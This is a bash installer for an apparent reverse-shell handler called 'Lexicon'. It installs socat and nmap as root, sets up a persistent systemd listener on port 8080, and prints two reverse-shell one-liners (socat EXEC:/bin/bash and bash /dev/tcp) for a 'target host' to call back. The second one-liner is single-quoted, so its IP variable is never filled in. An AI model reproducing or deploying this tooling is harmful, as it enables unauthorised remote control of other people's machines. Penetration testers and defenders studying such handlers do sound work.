#!/usr/bin/env bash

set -e

# Require root
if [[ $EUID -ne 0 ]]; then
	echo "Please run as root ( ./install.sh)"
	exit 1
fi


echo "[X] Installing Dependencies... [X]"
apt-get update
if ! command -v socat &> /dev/null 2>&1;
then
	echo "Installing socat..."

	apt-get install -y socat
fi

if ! command -v nmap &> /dev/null 2>&1;
then
	echo "Installing nmap..."

	apt-get install -y nmap
fi

mkdir -p /opt/lexicon/
mkdir -p /opt/lexicon/sessions
mkdir -p /opt/lexicon/scripts

# Get User
INSTALL_USER=${SUDO_USER:-$(whoami)}

echo "[X] Installing Scripts... [X]"
cp bin/lexicon.sh /usr/local/bin/lexicon
sed "s/__LEXICON_USER__/$INSTALL_USER/" systemd/lexicon.service > /etc/systemd/system/lexicon.service
cp bin/socat.sh /opt/lexicon/
cp bin/handler.sh /opt/lexicon/
cp scripts/*.sh /opt/lexicon/scripts/ 2>/dev/null || true

# setting permission, 755 for executable, 700 to only directory owner
chmod 755 /opt/lexicon/
chmod 755 /opt/lexicon/*.sh
chmod 755 /opt/lexicon/sessions
chmod 755 /opt/lexicon/scripts
chmod 755 /opt/lexicon/scripts/*.sh

echo "[X] Starting services... [X]"
systemctl daemon-reload
systemctl start lexicon.service
systemctl enable lexicon.service

chown -R "$INSTALL_USER":"$INSTALL_USER" /opt/lexicon/


#Add controller script to $PATH
chmod 755 /usr/local/bin/lexicon

SERVER_IP=$(hostname -I | awk '{print $1}')
echo "[✓] Lexicon installed successfully"
echo "Run 'lexicon' to open the controller"
echo "Listener running on port 8080, connect on target host with one of the following:"
echo "socat TCP:${SERVER_IP}:8080 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
echo 'bash -i >& /dev/tcp/${SERVER_IP}/8080 0>&1'
